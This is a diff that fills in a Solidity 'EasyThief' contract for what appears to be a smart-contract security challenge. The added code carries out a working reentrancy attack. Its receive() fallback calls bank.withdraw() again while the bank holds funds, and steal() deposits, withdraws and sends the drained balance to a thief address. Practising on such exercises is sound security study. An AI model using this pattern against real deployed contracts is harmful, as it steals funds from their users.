@@ -18,11 +18,17 @@ contract EasyThief {
     // CHALLENGE: IMPLEMENT PART OF THE EXPLOIT HERE
     //
     receive() external payable {
+        if (address(bank).balance >= msg.value) {
+            bank.withdraw(); 
+        }
     }
 
     //
     // CHALLENGE: THIS IS CALLED FIRST TO START THE STEAL
     //
     function steal() external payable {
+        bank.deposit{value: msg.value}();
+        bank.withdraw();
+        payable(thief).transfer(address(this).balance);
     }
 }
